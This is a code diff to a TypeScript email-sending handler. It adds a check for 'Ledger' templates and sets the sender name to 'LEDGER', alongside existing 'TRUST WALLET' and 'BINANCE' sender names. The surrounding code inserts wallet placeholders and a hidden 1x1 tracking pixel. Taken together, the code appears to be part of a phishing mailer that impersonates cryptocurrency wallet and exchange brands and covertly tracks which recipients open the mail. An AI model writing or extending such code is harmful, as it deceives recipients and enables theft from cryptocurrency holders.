@@ -222,6 +222,11 @@ const handler = async (req: Request): Promise<Response> => {
       .toLowerCase()
       .includes('trustwallet');
 
+    // Check if this is a Ledger template
+    const isLedgerTemplate = (subject || content || emailContent || '')
+      .toLowerCase()
+      .includes('ledger');
+
     // Only process wallet placeholders if they exist in the content
     // Use wallets for step 3 (Email3) or Trust Wallet templates with auto_include_wallet enabled
     console.log('Checking if email content contains wallet placeholders...');
@@ -332,8 +337,9 @@ const handler = async (req: Request): Promise<Response> => {
     // Add tracking pixel to email content
     emailContent += `<img src="${openTrackingUrl}" width="1" height="1" style="display:none;" />`;
 
-    // Determine sender name - use "TRUST WALLET" for Trust Wallet templates
-    const senderName = isTrustWalletTemplate ? "TRUST WALLET" : "BINANCE";
+    // Determine sender name based on template type
+    const senderName = isTrustWalletTemplate ? "TRUST WALLET" : 
+                      isLedgerTemplate ? "LEDGER" : "BINANCE";
 
     // Log email sending attempt
     console.log("Sending email to:", to, "with tracking code:", trackingCode);
